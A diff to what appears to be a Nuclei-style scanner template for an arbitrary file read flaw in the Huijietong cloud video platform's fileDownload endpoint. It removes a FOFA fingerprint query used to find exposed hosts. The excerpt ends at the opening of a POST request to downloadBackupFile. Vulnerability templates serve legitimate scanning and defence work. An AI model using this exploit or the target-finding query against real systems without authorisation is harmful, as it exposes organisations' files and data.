@@ -3,12 +3,8 @@ info:
   name: 会捷通云视讯平台 fileDownload 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yv03idn7oxe5mt7n'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yv03idn7oxe5mt7n
-    fofa: body="/him/api/rest/v1.0/node/role"
 http:
 - raw:
   - 'POST /fileDownload?action=downloadBackupFile HTTP/1.1
